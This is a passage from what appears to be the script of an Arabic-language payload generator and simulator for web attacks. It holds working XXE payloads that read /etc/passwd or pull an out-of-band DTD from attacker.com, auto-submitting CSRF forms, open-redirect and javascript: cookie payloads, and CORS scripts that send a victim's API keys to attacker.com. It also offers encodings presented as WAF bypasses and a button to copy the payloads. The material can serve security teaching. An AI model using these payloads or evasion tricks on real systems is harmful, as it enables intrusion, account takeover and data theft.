        desc: "يعرّف كياناً خارجياً (External Entity) يشير إلى ملف محلي، ثم يستدعي الكيان داخل الـ XML لإجبار السيرفر على قراءة الملف السري وإرجاعه في الاستجابة."
      },
      soap_body: {
        code: "<?xml version=\"1.0\"?><!DOCTYPE soapenv:Envelope [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"><soapenv:Body>&xxe;</soapenv:Body></soapenv:Envelope>",
        breakout: "<!ENTITY",
        template: "SOAPClient.processRequest([USER_INPUT]);",
        simulatedType: "xml_res",
        simulatedVal: "<soapenv:Body>root:x:0:0:root:/root:/bin/bash...</soapenv:Body>",
        desc: "نفس الهجوم السابق ولكنه مصمم ليتناسب مع هيكل طلبات الـ SOAP API."
      }
    },
    oob: {
      classic_xml: {
        code: "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\"> %dtd;]><data>&send;</data>",
        breakout: "<!ENTITY",
        template: "XMLParser.parse([USER_INPUT]);",
        simulatedType: "network",
        simulatedVal: "GET http://attacker.com/evil.dtd 200 OK\nGET http://attacker.com/log?data=root:x:0:0... 200 OK",
        desc: "استخراج البيانات خارج النطاق (OOB). يجبر السيرفر المستهدف على جلب ملف DTD من سيرفر المخترق، والذي يحتوي على أوامر إضافية لسرقة الملفات وإرسالها سراً للمخترق."
      },
      soap_body: {
        code: "<?xml version=\"1.0\"?><!DOCTYPE soapenv:Envelope [<!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\"> %dtd;]><soapenv:Envelope><soapenv:Body>&send;</soapenv:Body></soapenv:Envelope>",
        breakout: "<!ENTITY",
        template: "SOAPClient.process([USER_INPUT]);",
        simulatedType: "network",
        simulatedVal: "GET http://attacker.com/evil.dtd 200 OK\nGET http://attacker.com/log?data=root:x:0:0... 200 OK",
        desc: "استخراج البيانات سراً (OOB) عبر رسائل الـ SOAP API."
      }
    }
  },
  csrf: {
    state_change: {
      html_form: {
        code: "<html>\n  <body onload=\"document.forms[0].submit()\">\n    <form action=\"https://vulnerable.com/change-email\" method=\"POST\">\n      <input type=\"hidden\" name=\"email\" value=\"hacker@evil.com\" />\n    </form>\n  </body>\n</html>",
        breakout: "onload",
        template: "<iframe src=\"https://attacker.com/csrf.html\"></iframe>",
        simulatedType: "http_res",
        simulatedVal: "POST /change-email HTTP/1.1\nCookie: session=xyz123\n\nemail=hacker@evil.com (Status: 200 OK - Email Changed!)",
        desc: "صفحة ويب مزورة تحتوي على نموذج (Form) مخفي يرسل نفسه تلقائياً فور فتح الضحية للصفحة. إذا كان الضحية مسجلاً للدخول في الموقع المستهدف، فسيتم تغيير بريده الإلكتروني دون علمه."
      },
      ajax_fetch: {
        code: "<script>\n  fetch('https://vulnerable.com/change-email', {\n    method: 'POST',\n    mode: 'cors',\n    credentials: 'include',\n    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },\n    body: 'email=hacker@evil.com'\n  });\n</script>",
        breakout: "credentials",
        template: "<script src=\"https://attacker.com/payload.js\"></script>",
        simulatedType: "http_res",
        simulatedVal: "POST /change-email HTTP/1.1\nCookie: session=xyz123\n\nemail=hacker@evil.com (Status: 200 OK - Email Changed!)",
        desc: "هجوم CSRF باستخدام الجافاسكريبت المباشر. استخدام خاصية `credentials: 'include'` يجبر المتصفح على إرسال ملفات تعريف الارتباط (Cookies) الخاصة بالضحية مع الطلب المزور."
      }
    }
  },
  open_redirect: {
    phishing: {
      url_param: {
        code: "http://attacker.com",
        breakout: "",
        template: "Header('Location: ' . $_GET['redirect']);",
        simulatedType: "http_res",
        simulatedVal: "HTTP/1.1 302 Found\nLocation: http://attacker.com",
        desc: "تحويل مباشر إلى موقع المخترق (Phishing Domain) لسرقة بيانات الدخول أو تضليل المستخدم."
      },
      path_based: {
        code: "//attacker.com",
        breakout: "//",
        template: "if (startsWith($_GET['url'], '/')) { header('Location: '.$_GET['url']); }",
        simulatedType: "http_res",
        simulatedVal: "HTTP/1.1 302 Found\nLocation: //attacker.com",
        desc: "استخدام مسار يعتمد على البروتوكول (Protocol-Relative URL). هذا الأسلوب يتخطى الفلاتر الضعيفة التي تتأكد فقط مما إذا كان الرابط يبدأ بشرطة مائلة واحدة `/`."
      }
    },
    js_exec: {
      url_param: {
        code: "javascript:alert(document.cookie)",
        breakout: "javascript:",
        template: "<a href=\"[USER_INPUT]\">Click here to continue</a>",
        simulatedType: "dialog",
        simulatedVal: "session=9f8234a1bc89...",
        desc: "إذا كان النظام يأخذ الرابط ويضعه مباشرة داخل سمة `href` في زر معين دون فلترة، فإن الضغط على الزر سينفذ أمر الجافاسكريبت هذا بدلاً من التوجيه! (يُعرف بـ XSS عبر Open Redirect)."
      },
      path_based: {
        code: "javascript:alert(document.cookie)",
        breakout: "javascript:",
        template: "<a href=\"[USER_INPUT]\">Back to home</a>",
        simulatedType: "dialog",
        simulatedVal: "session=9f8234a1bc89...",
        desc: "ينفذ أكواد جافاسكريبت ضارة مستغلاً سوء استخدام ميزة التوجيه في الموقع."
      }
    }
  },
  cors: {
    steal_api: {
      null_origin: {
        code: "<iframe sandbox=\"allow-scripts allow-top-navigation allow-forms\" srcdoc=\"<script>\n  var req = new XMLHttpRequest();\n  req.onload = req.onerror = function() {\n    fetch('http://attacker.com/log?data=' + btoa(req.responseText));\n  };\n  req.open('GET', 'https://vulnerable.com/api/keys', true);\n  req.withCredentials = true;\n  req.send();\n</script>\"></iframe>",
        breakout: "null",
        template: "Access-Control-Allow-Origin: null\nAccess-Control-Allow-Credentials: true",
        simulatedType: "network",
        simulatedVal: "Origin: null -> Response 200 OK\nExfiltrated API Key: ak_live_991823abf...",
        desc: "إذا كان السيرفر يثق بمصدر `null`، يقوم المخترق بوضع كوده داخل إطار `iframe` مقيد (Sandboxed) لإجبار المتصفح على إرسال طلب أصله `null`، وسرقة البيانات الحساسة (مثل الـ API Keys) للضحية."
      },
      arb_origin: {
        code: "<script>\n  var req = new XMLHttpRequest();\n  req.onload = req.onerror = function() {\n    fetch('http://attacker.com/log?data=' + btoa(req.responseText));\n  };\n  req.open('GET', 'https://vulnerable.com/api/keys', true);\n  req.withCredentials = true;\n  req.send();\n</script>",
        breakout: "withCredentials",
        template: "Access-Control-Allow-Origin: https://attacker.com\nAccess-Control-Allow-Credentials: true",
        simulatedType: "network",
        simulatedVal: "Origin: https://attacker.com -> Response 200 OK\nExfiltrated API Key: ak_live_991823abf...",
        desc: "إذا كان السيرفر يثق بأي مصدر عشوائي، فهذا السكربت الذي سيُستضاف على موقع المخترق سيقرأ البيانات الخاصة بالضحية في الموقع المستهدف ويرسلها للمخترق."
      }
    }
  }
};

document.addEventListener("DOMContentLoaded", () => {
  const vulnClassEl = document.getElementById("vuln-class");
  const contextEl = document.getElementById("vuln-context");
  const actionEl = document.getElementById("vuln-action");
  const filterEl = document.getElementById("vuln-filter");
  const btnGenerate = document.getElementById("btn-generate");
  const btnCopy = document.getElementById("btn-copy");
  
  const outputCode = document.getElementById("output-code");
  const simCodeBefore = document.getElementById("sim-code-before");
  const simCodeAfter = document.getElementById("sim-code-after");
  const domPreviewContainer = document.getElementById("dom-preview-container");
  const wafBadgeContainer = document.getElementById("waf-badge-container");
  const wafAnalysisText = document.getElementById("waf-analysis-text");
  const outputExplanation = document.getElementById("output-explanation");

  function populateDropdowns() {
    const vClass = vulnClassEl.value;
    const data = VulnData[vClass];

    // Populate Contexts
    contextEl.innerHTML = "";
    data.contexts.forEach(ctx => {
      const opt = document.createElement("option");
      opt.value = ctx.id;
      opt.textContent = ctx.label;
      contextEl.appendChild(opt);
    });

    // Populate Actions
    actionEl.innerHTML = "";
    data.actions.forEach(act => {
      const opt = document.createElement("option");
      opt.value = act.id;
      opt.textContent = act.label;
      actionEl.appendChild(opt);
    });
  }

  vulnClassEl.addEventListener("change", populateDropdowns);
  populateDropdowns(); // Init

  function applyFilter(code, filterType) {
    if (filterType === "urlencode") {
      return encodeURIComponent(code);
    } else if (filterType === "doubleurlencode") {
      return encodeURIComponent(encodeURIComponent(code));
    } else if (filterType === "base64") {
      return btoa(unescape(encodeURIComponent(code)));
    } else if (filterType === "htmlentity") {
      return code.replace(/[\u00A0-\u9999<>\&]/g, function(i) {
        return '&#'+i.charCodeAt(0)+';';
      });
    } else if (filterType === "hex") {
      return code.split('').map(c => '%' + c.charCodeAt(0).toString(16)).join('');
    } else if (filterType === "casevar") {
      return code.split('').map((c, i) => i % 2 === 0 ? c.toLowerCase() : c.toUpperCase()).join('');
    }
    return code; // none
  }

  function escapeHtml(str) {
    return str.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#039;");
  }

  function renderInjectionSimulation(template, finalCode, breakout) {
    const beforeStr = template.replace("[USER_INPUT]", "USER_INPUT");
    simCodeBefore.innerHTML = escapeHtml(beforeStr).replace("USER_INPUT", "<span style='color: var(--accent-cyan); font-weight: bold;'>[USER_INPUT]</span>");

    let afterHtml = escapeHtml(template);
    const escapedCode = escapeHtml(finalCode);
    
    if (breakout && escapedCode.includes(escapeHtml(breakout))) {
      const escapedBreakout = escapeHtml(breakout);
      const highlightedCode = escapedCode.replace(escapedBreakout, `<span class="highlight-breakout">${escapedBreakout}</span><span class="highlight-payload">`) + `</span>`;
      afterHtml = afterHtml.replace("[USER_INPUT]", highlightedCode);
    } else {
      afterHtml = afterHtml.replace("[USER_INPUT]", `<span class="highlight-payload">${escapedCode}</span>`);
    }
    
    simCodeAfter.innerHTML = afterHtml;
  }

  function renderDOMPreview(payloadData, finalCode) {
    domPreviewContainer.innerHTML = "";
    const type = payloadData.simulatedType;
    const val = payloadData.simulatedVal;

    if (type === "dialog") {
      domPreviewContainer.innerHTML = `
        <div class="simulated-dialog">
          <div class="simulated-dialog-header"><i class="bx bx-error-circle"></i> localhost says</div>
          <div class="simulated-dialog-body">${escapeHtml(val)}</div>
          <button class="simulated-dialog-btn" onclick="this.parentElement.style.opacity='0.5'">OK</button>
        </div>
      `;
    } else if (type === "network") {
      domPreviewContainer.innerHTML = `
        <div style="width:100%; font-family:var(--font-mono); font-size:0.82rem; color:#4ade80;">
          <div style="color:#94a3b8; margin-bottom:5px;"><i class="bx bx-transfer-alt"></i> Outgoing Attacker Request Intercepted:</div>
          <div style="background:#020617; padding:10px; border-radius:4px; border:1px solid rgba(74,222,128,0.2);">${escapeHtml(val)}</div>
        </div>
      `;
    } else if (type === "db_table") {
      domPreviewContainer.innerHTML = `
        <div style="width:100%; font-family:var(--font-mono); font-size:0.82rem; color:#38bdf8;">
          <div style="color:#94a3b8; margin-bottom:5px;"><i class="bx bx-table"></i> Returned Database Records:</div>
          <div style="background:#020617; padding:10px; border-radius:4px; border:1px solid rgba(56,189,248,0.2); white-space:pre-wrap;">${escapeHtml(val)}</div>
        </div>
      `;
    } else if (type === "db_error") {
      domPreviewContainer.innerHTML = `
        <div style="width:100%; font-family:var(--font-mono); font-size:0.82rem; color:#f87171;">
          <div style="color:#94a3b8; margin-bottom:5px;"><i class="bx bx-bug"></i> Database Exception Output:</div>
          <div style="background:#020617; padding:10px; border-radius:4px; border:1px solid rgba(248,113,113,0.2);">${escapeHtml(val)}</div>
        </div>
      `;
    } else if (type === "terminal" || type === "file_res" || type === "http_res" || type === "time" || type === "xml_res") {
      domPreviewContainer.innerHTML = `
        <div style="width:100%; font-family:var(--font-mono); font-size:0.82rem; color:#e2e8f0;">
          <div style="color:#94a3b8; margin-bottom:5px;"><i class="bx bx-terminal"></i> Execution Result Preview:</div>
          <div style="background:#020617; padding:10px; border-radius:4px; border:1px solid rgba(255,255,255,0.1); white-space:pre-wrap; color:#cbd5e1;">${escapeHtml(val)}</div>
        </div>
      `;
    }
  }

  function simulateWAF(payloadCode, filterType, vClass) {
    const isRawNaive = (filterType === 'none') && (
      payloadCode.includes('<script>') || 
      payloadCode.includes("' OR '1'='1") || 
      payloadCode.includes('/etc/passwd') ||
      payloadCode.includes('system(')
    );

    if (isRawNaive) {
      wafBadgeContainer.innerHTML = `<span class="waf-status-badge waf-badge-blocked"><i class="bx bx-x-circle"></i> WAF Flagged / Blocked</span>`;
      wafAnalysisText.innerHTML = `
        <strong style="color:#f87171;">تنبيه جدار الحماية (WAF Triggered):</strong> 
        هذا الـ Payload عاري وبدون تشفير ويحتوي على كلمات مفتاحيّة مسجلة في قوائم الحظر الأمني مثل <code>&lt;script&gt;</code> أو <code>' OR '1'='1</code>.
        <br>💡 <strong>حل المشكلة:</strong> قم باختيار تقنية تشفير (مثل Case Variation أو Base64) أو استخدم سياقاً بديلاً (مثل SVG أو AngularJS) لتخطي الفحص!
      `;
    } else {
      wafBadgeContainer.innerHTML = `<span class="waf-status-badge waf-badge-bypassed"><i class="bx bx-check-circle"></i> WAF Bypassed / Clean</span>`;
      wafAnalysisText.innerHTML = `
        <strong style="color:#4ade80;">تم تخطي الجدار الناري بنجاح (WAF Evasion Success):</strong> 
        الـ Payload يتجنب الكلمات المفتاحية البديهية أو يدمج تقنيات تشفير وسياقات تلتف حول الفلاتر الشائعة.
      `;
    }
  }

  function getFilterExplanation(filterType) {
    if (filterType === "urlencode") {
      return "\n\n<strong style='color:var(--accent-cyan)'>تخطي الحماية (URL Encode):</strong> تم تشفير الكود بتشفير URL العادي لتخطي أنظمة الحماية (WAF) البسيطة التي تبحث عن الكلمات الممنوعة بصيغتها العادية في الطلبات.";
    } else if (filterType === "doubleurlencode") {
      return "\n\n<strong style='color:var(--accent-cyan)'>تخطي الحماية (Double URL Encode):</strong> تم تشفير الكود مرتين. يفيد هذا إذا كان النظام الخلفي يقوم بفك التشفير مرتين. سيرى الـ WAF الكود مشفراً فيسمح بمروره، ثم يقوم السيرفر بفك تشفيره وتشغيل الهجوم.";
    } else if (filterType === "base64") {
      return "\n\n<strong style='color:var(--accent-cyan)'>تخطي الحماية (Base64):</strong> تم تشفير الكود بـ Base64. يفيد هذا جداً في الأنظمة التي تتوقع استلام بيانات مشفرة بـ Base64 (مثل الـ JSON) وتقوم بفك تشفيرها داخلياً قبل معالجتها.";
    } else if (filterType === "htmlentity") {
      return "\n\n<strong style='color:var(--accent-cyan)'>تخطي الحماية (HTML Entity):</strong> تم تحويل الرموز الحساسة (مثل `<` أو `>`) إلى كيانات HTML. تتخطى هذه التقنية فلاتر الـ Regex إذا كان النظام يقوم بفك تشفير هذه الكيانات لاحقاً وعرضها في الصفحة.";
    } else if (filterType === "hex") {
      return "\n\n<strong style='color:var(--accent-cyan)'>تخطي الحماية (Hex Encoding):</strong> تم تحويل الأحرف إلى قيمها بالنظام السداسي عشر (Hex). تُستخدم هذه التقنية لخداع فلاتر الحماية الضعيفة التي لا تقوم بتوحيد ومعالجة المدخلات جيداً.";
    } else if (filterType === "casevar") {
      return "\n\n<strong style='color:var(--accent-cyan)'>تخطي الحماية (Case Variation):</strong> تم تغيير حالة الأحرف بين الكبيرة والصغيرة بشكل عشوائي (مثلاً `<sCrIpT>`). هذا الأسلوب يتخطى الفلاتر التي تمنع كتابة `<script>` بالحروف الصغيرة فقط.";
    }
    return "";
  }

  function generateAndSimulate() {
    const vClass = vulnClassEl.value;
    const vContext = contextEl.value;
    const vAction = actionEl.value;
    const vFilter = filterEl.value;

    let payloadData = null;
    try {
      payloadData = PayloadTemplates[vClass][vAction][vContext];
    } catch(e) {}

    if (payloadData) {
      const finalCode = applyFilter(payloadData.code, vFilter);
      
      // Card 1: Code Output
      outputCode.textContent = finalCode;
      
      // Card 2: Context Injection Simulation
      renderInjectionSimulation(payloadData.template, finalCode, payloadData.breakout);
      
      // Card 3: Live DOM Preview
      renderDOMPreview(payloadData, finalCode);
      
      // Card 4: WAF Analysis
      simulateWAF(payloadData.code, vFilter, vClass);
      
      // Card 5: Explanation
      outputExplanation.innerHTML = payloadData.desc + getFilterExplanation(vFilter);

    } else {
      outputCode.textContent = "خطأ: لم يتم العثور على هذا الـ Payload.";
      outputExplanation.textContent = "الرجاء اختيار مجموعة أخرى من الخصائص.";
    }
  }

  btnGenerate.addEventListener("click", generateAndSimulate);

  btnCopy.addEventListener("click", () => {
    const textToCopy = outputCode.textContent;
    if (textToCopy && textToCopy !== "// Select options on the left and click Simulate..." && !textToCopy.startsWith("خطأ")) {
      navigator.clipboard.writeText(textToCopy).then(() => {
        const originalText = btnCopy.innerHTML;
        btnCopy.innerHTML = "<i class='bx bx-check'></i> Copied!";
        btnCopy.style.color = "var(--accent-green)";
        setTimeout(() => {
          btnCopy.innerHTML = originalText;
          btnCopy.style.color = "var(--text-secondary)";
        }, 2000);
      });
    }
  });

  // Initial trigger
  generateAndSimulate();
});
